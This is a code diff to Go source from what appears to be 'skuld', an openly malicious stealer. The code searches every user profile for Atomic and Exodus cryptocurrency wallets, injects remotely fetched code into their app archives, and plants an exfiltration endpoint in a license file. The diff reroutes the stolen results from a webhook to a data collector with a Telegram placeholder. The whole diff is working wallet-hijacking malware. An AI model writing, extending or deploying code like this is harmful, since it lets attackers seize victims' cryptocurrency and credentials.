@@ -8,14 +8,15 @@ import (
 
 	"github.com/hackirby/skuld/utils/fileutil"
 	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/hackirby/skuld/utils/collector"
 )
 
-func Run(atomic_injection_url, exodus_injection_url, webhook string) {
-	AtomicInjection(atomic_injection_url, webhook)
-	ExodusInjection(exodus_injection_url, webhook)
+func Run(atomic_injection_url, exodus_injection_url string, dataCollector *collector.DataCollector) {
+	AtomicInjection(atomic_injection_url, dataCollector)
+	ExodusInjection(exodus_injection_url, dataCollector)
 }
 
-func AtomicInjection(atomic_injection_url, webhook string) {
+func AtomicInjection(atomic_injection_url string, dataCollector *collector.DataCollector) {
 	for _, user := range hardware.GetUsers() {
 		atomicPath := filepath.Join(user, "AppData", "Local", "Programs", "atomic")
 		if !fileutil.IsDir(atomicPath) {
@@ -29,11 +30,11 @@ func AtomicInjection(atomic_injection_url, webhook string) {
 			continue
 		}
 
-		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, webhook)
+		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, dataCollector)
 	}
 }
 
-func ExodusInjection(exodus_injection_url, webhook string) {
+func ExodusInjection(exodus_injection_url string, dataCollector *collector.DataCollector) {
 	for _, user := range hardware.GetUsers() {
 		exodusPath := filepath.Join(user, "AppData", "Local", "exodus")
 		if !fileutil.IsDir(exodusPath) {
@@ -58,11 +59,11 @@ func ExodusInjection(exodus_injection_url, webhook string) {
 			continue
 		}
 
-		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, webhook)
+		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, dataCollector)
 	}
 }
 
-func Injection(path, licensePath, injection_url, webhook string) {
+func Injection(path, licensePath, injection_url string, dataCollector *collector.DataCollector) {
 	if !fileutil.Exists(path) {
 		return
 	}
@@ -93,5 +94,14 @@ func Injection(path, licensePath, injection_url, webhook string) {
 	}
 	defer license.Close()
 
-	license.WriteString(webhook)
+	// For wallet injection, we'll use a placeholder since we're not using webhooks anymore
+	license.WriteString("TELEGRAM_PLACEHOLDER")
+
+	// Log injection success
+	injectionInfo := map[string]interface{}{
+		"Status":      "Wallet injection completed",
+		"TargetPath":  path,
+		"LicensePath": licensePath,
+	}
+	dataCollector.AddData("wallet_injection", injectionInfo)
 }
